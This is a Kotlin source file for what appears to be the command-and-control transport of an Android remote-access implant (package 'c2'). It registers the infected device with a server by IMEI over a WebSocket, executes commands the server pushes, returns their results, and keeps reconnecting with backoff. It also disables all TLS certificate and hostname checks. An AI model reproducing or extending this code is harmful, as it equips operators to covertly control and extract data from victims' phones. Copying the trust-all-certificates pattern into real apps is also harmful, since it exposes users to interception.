package org.synapse.core.c2

import android.util.Log
import kotlinx.coroutines.*
import kotlinx.serialization.Serializable
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import okhttp3.*
import java.util.concurrent.TimeUnit
import javax.net.ssl.SSLContext
import javax.net.ssl.TrustManager
import javax.net.ssl.X509TrustManager
import java.security.cert.X509Certificate

class WebSocketTransport(
    private val serverUrl: String,
    private val onCommand: (Command) -> String,
    private val onStatus: (String) -> Unit = {}
) {
    companion object {
        private const val TAG = "Synapse.WS"
        private const val MAX_RECONNECT_DELAY = 120_000L
        private const val INITIAL_RECONNECT_DELAY = 2_000L
    }

    private val json = Json { ignoreUnknownKeys = true }

    private val trustAllCerts = arrayOf<TrustManager>(object : X509TrustManager {
        override fun checkClientTrusted(c: Array<X509Certificate>?, a: String?) {}
        override fun checkServerTrusted(c: Array<X509Certificate>?, a: String?) {}
        override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
    })

    private val client = OkHttpClient.Builder()
        .pingInterval(30, TimeUnit.SECONDS)
        .sslSocketFactory(
            SSLContext.getInstance("TLS").apply { init(null, trustAllCerts, java.security.SecureRandom()) }.socketFactory,
            trustAllCerts[0] as X509TrustManager
        )
        .hostnameVerifier { _, _ -> true }
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .build()

    private var ws: WebSocket? = null
    private var reconnectDelay = INITIAL_RECONNECT_DELAY
    private var shouldReconnect = true
    private var connected = false
    private var deviceId: String = ""

    @Serializable
    data class Hello(val type: String, val device_id: String, val info: String = "{}")

    fun connect(imei: String) {
        deviceId = imei
        shouldReconnect = true
        reconnectDelay = INITIAL_RECONNECT_DELAY
        doConnect()
    }

    fun disconnect() {
        shouldReconnect = false
        ws?.close(1000, "bye")
        ws = null
        connected = false
    }

    fun send(payload: String) {
        ws?.send(payload)
    }

    fun isConnected(): Boolean = connected

    private fun doConnect() {
        val request = Request.Builder().url(serverUrl).build()
        ws = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(ws: WebSocket, response: Response) {
                connected = true
                reconnectDelay = INITIAL_RECONNECT_DELAY
                onStatus("connected")
                val hello = json.encodeToString(Hello(type = "register", device_id = deviceId))
                ws.send(hello)
            }

            override fun onMessage(ws: WebSocket, text: String) {
                try {
                    val cmd = json.decodeFromString<Command>(text)
                    val result = onCommand(cmd)
                    ws.send(result)
                } catch (e: Exception) {
                    Log.e(TAG, "parse error: ${e.message}")
                    ws.send("""{"cmd_id":"?","status":"error","error":"parse_failed"}""")
                }
            }

            override fun onFailure(ws: WebSocket, t: Throwable, resp: Response?) {
                connected = false
                onStatus("disconnected: ${t.message}")
                scheduleReconnect()
            }

            override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                connected = false
                onStatus("closed: $code")
                scheduleReconnect()
            }
        })
    }

    private fun scheduleReconnect() {
        if (!shouldReconnect) return
        Thread {
            Thread.sleep(reconnectDelay)
            reconnectDelay = (reconnectDelay * 2).coerceAtMost(MAX_RECONNECT_DELAY)
            doConnect()
        }.start()
    }
}
